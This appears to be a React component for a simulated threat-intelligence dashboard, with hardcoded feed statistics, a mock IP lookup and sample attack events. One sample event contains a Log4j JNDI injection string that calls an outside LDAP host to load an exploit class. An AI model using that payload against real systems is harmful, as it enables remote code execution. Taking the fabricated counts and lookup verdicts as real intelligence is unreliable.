import React, { useState } from 'react';
import { ViewId, ThreatEvent } from '../types.ts';

interface ThreatIntelViewProps {
  onNavigate: (view: ViewId) => void;
}

export const ThreatIntelView: React.FC<ThreatIntelViewProps> = ({ onNavigate }) => {
  const [selectedThreat, setSelectedThreat] = useState<ThreatEvent | null>(null);
  const [iocQuery, setIocQuery] = useState<string>('');
  const [queryResult, setQueryResult] = useState<string | null>(null);
  const [isSyncing, setIsSyncing] = useState<boolean>(false);

  const feeds = [
    { name: 'CrowdSec Community Consensus', entries: '412,809 IPs', status: 'SYNCHRONIZED', updated: '4 mins ago', trust: '99.8%' },
    { name: 'AlienVault OTX Pulse Feed', entries: '184,204 IPs', status: 'SYNCHRONIZED', updated: '12 mins ago', trust: '98.5%' },
    { name: 'AbuseIPDB High Confidence (>90%)', entries: '92,150 IPs', status: 'SYNCHRONIZED', updated: '1 hr ago', trust: '99.1%' },
    { name: 'Emerging Threats (ET Open Ruleset)', entries: '48,912 Rules', status: 'ACTIVE IN ENGINE', updated: '2 hrs ago', trust: '99.9%' },
    { name: 'CISA Known Exploited Vulnerabilities (KEV)', entries: '1,142 CVEs', status: 'ENFORCED', updated: '6 hrs ago', trust: '100%' },
  ];

  const threats: ThreatEvent[] = [
    {
      id: 'EVT-90412',
      time: '13:28:44.102',
      severity: 'CRIT',
      name: 'Apache Log4j Remote Code Execution (JNDI Injection)',
      cve: 'CVE-2021-44228',
      sid: '2034361',
      rev: '4',
      proto: 'TCP',
      port: '443 (HTTPS)',
      srcIp: '185.220.101.5',
      srcCountry: 'DE 🇩🇪',
      srcAsn: 'AS208323 (Tor Exit Relay Group)',
      srcDomain: 'relay-exit-05.torproject.org',
      targetHost: '10.0.10.5 (DMZ Reverse Proxy)',
      targetLabel: 'Edge Nginx Web cluster',
      action: 'BLOCKED_AT_NIC (eBPF XDP DROP)',
      threatScore: 99,
      reputation: 'Known Tor Malicious Scanner / Mass Exploiter',
      payloadStream: '${jndi:ldap://45.154.255.89:1389/Exploit.class}',
      hexDump: `0000   24 7b 6a 6e 64 69 3a 6c  64 61 70 3a 2f 2f 34 35   \${jndi:ldap://45
0010   2e 31 35 34 2e 32 35 35  2e 38 39 3a 31 33 38 39   .154.255.89:1389
0020   2f 45 78 70 6c 6f 69 74  2e 63 6c 61 73 73 7d 0d   /Exploit.class}.
0030   0a 55 73 65 72 2d 41 67  65 6e 74 3a 20 4d 6f 7a   .User-Agent: Moz`,
    },
    {
      id: 'EVT-90411',
      time: '13:27:12.890',
      severity: 'HIGH',
      name: 'Cobalt Strike Malleable C2 Beacon Heartbeat',
      cve: 'C2-STRIKE-v4',
      sid: '2849102',
      rev: '2',
      proto: 'TCP',
      port: '8443',
      srcIp: '91.240.118.172',
      srcCountry: 'RU 🇷🇺',
      srcAsn: 'AS49505 (Hostkey B.V.)',
      targetHost: '172.16.50.44 (Tuya IoT Camera)',
      targetLabel: 'VLAN 50 Isolated IoT',
      action: 'DROPPED (Zero-Trust Sandbox)',
      threatScore: 94,
      reputation: 'Botnet Command & Control Infrastructure',
      payloadStream: 'POST /api/v2/telemetry/sync HTTP/1.1 Cookie: __cfduid=a8f09b...',
      hexDump: `0000   50 4f 53 54 20 2f 61 70  69 2f 76 32 2f 74 65 6c   POST /api/v2/tel
0010   65 6d 65 74 72 79 2f 73  79 6e 63 20 48 54 54 50   emetry/sync HTTP
0020   2f 31 2e 31 0d 0a 43 6f  6f 6b 69 65 3a 20 5f 5f   /1.1..Cookie: __`,
    },
    {
      id: 'EVT-90410',
      time: '13:24:05.418',
      severity: 'HIGH',
      name: 'Mirai IoT Botnet Brute-Force Scanner (Telnet/23)',
      cve: 'MIRAI-SYN-SCAN',
      sid: '2010992',
      rev: '8',
      proto: 'TCP',
      port: '23 (TELNET)',
      srcIp: '103.145.13.8',
      srcCountry: 'VN 🇻🇳',
      srcAsn: 'AS135905 (Viettel Military Telecom)',
      targetHost: '192.168.1.254 (Gateway)',
      targetLabel: 'WAN Ingress eth0',
      action: 'SILENT_DISCARD (SYN Cookie Spoof Defense)',
      threatScore: 91,
      reputation: 'Infected DVR / Smart Router botnet participant',
      payloadStream: 'admin / 123456 / default passwords dictionary probe',
    },
    {
      id: 'EVT-90409',
      time: '13:21:49.002',
      severity: 'MED',
      name: 'DNS Tunneling Subdomain Exfiltration Query',
      cve: 'DNS-EXFIL-v2',
      sid: '2109881',
      rev: '1',
      proto: 'UDP',
      port: '53 (DNS)',
      srcIp: '172.16.50.88',
      srcCountry: 'LOCAL',
      srcAsn: 'Internal IoT Subnet',
      targetHost: '8.8.8.8 (Google DNS)',
      targetLabel: 'Redirected to Local Sinkhole',
      action: 'SINKHOLED (AdBlock Engine)',
      threatScore: 78,
      reputation: 'Suspicious High-Entropy Base64 Hostname',
      payloadStream: 'a9f0b83e442910fa.sync.telemetry-gateway.cn',
    },
  ];

  const handleSyncFeeds = () => {
    setIsSyncing(true);
    setTimeout(() => {
      setIsSyncing(false);
    }, 1200);
  };

  const handleQueryIoc = () => {
    if (!iocQuery.trim()) return;
    const clean = iocQuery.trim();
    if (clean.includes('185.220.101.5') || clean.includes('45.154.255.89') || clean.includes('91.240.118.172')) {
      setQueryResult(`🚨 MATCH FOUND: In CrowdSec + AlienVault Blacklist. Threat Score: 99/100 (CRITICAL C2). Immediate eBPF drop active.`);
    } else if (clean.includes('google') || clean.includes('1.1.1.1') || clean.includes('github')) {
      setQueryResult(`✅ CLEAN: IP/Domain verified in Global CDN and trusted enterprise whitelist.`);
    } else {
      setQueryResult(`ℹ️ NO MATCH in active blacklists. Dynamic behavioral heuristics score: 12/100 (Low risk).`);
    }
  };

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 p-4 rounded-xl bg-surface-container-low border border-outline-variant/30">
        <div>
          <div className="flex items-center gap-2">
            <span className="inline-block w-2.5 h-2.5 rounded-full bg-rose-400 animate-pulse"></span>
            <h2 className="text-xl font-bold font-headline text-on-surface">Threat Intelligence & Global Blacklists</h2>
            <span className="px-2 py-0.5 text-xs rounded bg-surface-container-highest border border-outline-variant/40 font-mono text-primary font-semibold">
              Total Enforced IOCs: 738,075
            </span>
          </div>
          <p className="text-xs text-on-surface-variant mt-1 font-mono">
            Automated synchronization with high-confidence security consensus feeds, C2 IP blocklists, and zero-day signatures.
          </p>
        </div>

        <div className="flex items-center gap-3">
          <button
            onClick={handleSyncFeeds}
            disabled={isSyncing}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-primary hover:bg-primary/90 text-on-primary text-xs font-mono font-bold transition-all disabled:opacity-50"
          >
            {isSyncing ? 'Synchronizing eBPF Maps...' : '⚡ Sync Feeds Now'}
          </button>
          <button
            onClick={() => onNavigate('ai-ids-ips')}
            className="px-3 py-1.5 rounded-lg bg-surface-container hover:bg-surface-container-high text-on-surface text-xs font-mono border border-outline-variant/30"
          >
            AI Anomaly Engine →
          </button>
        </div>
      </div>

      {/* Quick IOC Search Box */}
      <div className="p-4 rounded-xl bg-surface-container-low border border-outline-variant/30 space-y-3">
        <div className="flex flex-col sm:flex-row items-center gap-3">
          <div className="relative flex-1 w-full">
            <input
              type="text"
              placeholder="Query any IP address, CIDR, or domain against eBPF threat map..."
              value={iocQuery}
              onChange={(e) => setIocQuery(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleQueryIoc()}
              className="w-full text-xs font-mono bg-surface-container-lowest border border-outline-variant/30 rounded-lg pl-3 pr-24 py-2 text-on-surface placeholder:text-on-surface-variant/50 focus:border-primary focus:outline-none"
            />
            <button
              onClick={handleQueryIoc}
              className="absolute right-1 top-1 bottom-1 px-3 bg-primary hover:bg-primary/90 text-on-primary rounded text-xs font-mono font-bold"
            >
              Lookup
            </button>
          </div>
        </div>

        {queryResult && (
          <div className="p-3 rounded-lg bg-surface-container-lowest border border-outline-variant/30 text-xs font-mono">
            {queryResult}
          </div>
        )}
      </div>

      {/* Feed Status Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
        {feeds.map((f, i) => (
          <div key={i} className="p-3 rounded-xl bg-surface-container-low border border-outline-variant/30 space-y-1.5">
            <div className="text-[11px] font-bold text-on-surface truncate">{f.name}</div>
            <div className="text-base font-bold font-mono text-primary">{f.entries}</div>
            <div className="flex items-center justify-between text-[10px] font-mono text-on-surface-variant pt-1 border-t border-outline-variant/20">
              <span className="text-emerald-400 font-bold">{f.status}</span>
              <span>{f.updated}</span>
            </div>
          </div>
        ))}
      </div>

      {/* Live Threat Incident Feed */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        <div className={`${selectedThreat ? 'lg:col-span-7' : 'lg:col-span-12'} transition-all`}>
          <div className="p-4 rounded-xl bg-surface-container-low border border-outline-variant/30 overflow-hidden">
            <div className="flex items-center justify-between pb-3 border-b border-outline-variant/20 mb-3">
              <h3 className="text-sm font-bold text-on-surface font-headline">Real-Time Ingress Attack Log (Past 1 Hour)</h3>
              <span className="text-xs font-mono text-rose-400 font-bold">14,289 Attacks Neutralized</span>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead className="text-[10px] uppercase tracking-wider text-on-surface-variant/80 border-b border-outline-variant/20">
                  <tr>
                    <th className="py-2.5 px-3">Sev</th>
                    <th className="py-2.5 px-3">Timestamp</th>
                    <th className="py-2.5 px-3">Attack Classification</th>
                    <th className="py-2.5 px-3">Attacker Source</th>
                    <th className="py-2.5 px-3">Target</th>
                    <th className="py-2.5 px-3">Enforcement Action</th>
                    <th className="py-2.5 px-3 text-right">Details</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-outline-variant/15 text-on-surface">
                  {threats.map((t) => {
                    const isSel = selectedThreat?.id === t.id;
                    return (
                      <tr
                        key={t.id}
                        onClick={() => setSelectedThreat(t)}
                        className={`cursor-pointer transition-colors ${
                          isSel ? 'bg-primary/15' : 'hover:bg-surface-container/50'
                        }`}
                      >
                        <td className="py-3 px-3">
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              t.severity === 'CRIT'
                                ? 'bg-rose-500/20 text-rose-400 border border-rose-500/40 animate-pulse'
                                : t.severity === 'HIGH'
                                ? 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                                : 'bg-cyan-500/20 text-cyan-400 border border-cyan-500/40'
                            }`}
                          >
                            {t.severity}
                          </span>
                        </td>
                        <td className="py-3 px-3 text-on-surface-variant">{t.time}</td>
                        <td className="py-3 px-3 font-sans">
                          <div className="font-semibold text-xs text-on-surface">{t.name}</div>
                          {t.cve && (
                            <span className="text-[10px] font-mono text-primary font-bold">{t.cve}</span>
                          )}
                        </td>
                        <td className="py-3 px-3">
                          <div className="font-bold text-on-surface flex items-center gap-1.5">
                            <span>{t.srcCountry}</span>
                            <span>{t.srcIp}</span>
                          </div>
                          <div className="text-[10px] text-on-surface-variant truncate max-w-[140px]">
                            {t.srcAsn}
                          </div>
                        </td>
                        <td className="py-3 px-3">
                          <div className="text-on-surface">{t.targetHost}</div>
                          <div className="text-[10px] text-on-surface-variant">{t.port}</div>
                        </td>
                        <td className="py-3 px-3">
                          <span className="text-emerald-400 font-bold text-[11px]">{t.action}</span>
                        </td>
                        <td className="py-3 px-3 text-right">
                          <button className="px-2 py-1 bg-surface-container hover:bg-surface-container-high rounded text-primary text-[10px] font-bold">
                            Inspect
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        {/* Threat Deep Forensic Inspector */}
        {selectedThreat && (
          <div className="lg:col-span-5 space-y-4">
            <div className="p-4 rounded-xl bg-surface-container-low border border-rose-500/30 space-y-3">
              <div className="flex items-center justify-between pb-2 border-b border-outline-variant/20">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping"></span>
                  <span className="text-xs font-bold text-on-surface font-headline">Incident Forensic Analysis</span>
                </div>
                <button
                  onClick={() => setSelectedThreat(null)}
                  className="text-on-surface-variant hover:text-on-surface text-xs"
                >
                  ✕
                </button>
              </div>

              <div className="space-y-3 text-xs font-mono">
                <div className="p-3 rounded-lg bg-surface-container-lowest border border-outline-variant/20 space-y-1">
                  <div className="text-[10px] text-on-surface-variant uppercase">Threat Classification</div>
                  <div className="text-sm font-bold text-rose-400">{selectedThreat.name}</div>
                  <div className="text-xs text-on-surface">Signature ID: SID:{selectedThreat.sid} Rev:{selectedThreat.rev}</div>
                  <div className="text-xs text-on-surface-variant">Attacker Reputation: {selectedThreat.reputation}</div>
                </div>

                <div className="p-3 rounded-lg bg-surface-container-lowest border border-outline-variant/20 space-y-1">
                  <div className="text-[10px] text-on-surface-variant uppercase">Decoded Payload Signature</div>
                  <div className="p-2 rounded bg-surface-container text-amber-300 font-mono text-[11px] break-all select-all">
                    {selectedThreat.payloadStream}
                  </div>
                </div>

                {selectedThreat.hexDump && (
                  <div className="p-3 rounded-lg bg-surface-container-lowest border border-outline-variant/20 space-y-1">
                    <div className="text-[10px] text-on-surface-variant uppercase">Wire-Level Hex Dump</div>
                    <pre className="text-[10px] font-mono text-cyan-300 overflow-x-auto p-2 rounded bg-surface-container leading-relaxed">
                      {selectedThreat.hexDump}
                    </pre>
                  </div>
                )}

                <div className="flex gap-2 pt-2">
                  <button
                    onClick={() => {
                      alert(`Source IP ${selectedThreat.srcIp} added to permanent eBPF hardware block map.`);
                    }}
                    className="flex-1 py-2 px-3 rounded-lg bg-rose-600 hover:bg-rose-500 text-white font-bold text-xs transition-colors text-center"
                  >
                    Blacklist IP Permanently
                  </button>
                  <button
                    onClick={() => onNavigate('packet-inspector')}
                    className="py-2 px-3 rounded-lg bg-surface-container hover:bg-surface-container-high text-on-surface font-bold text-xs border border-outline-variant/30"
                  >
                    PCAP Forensics
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
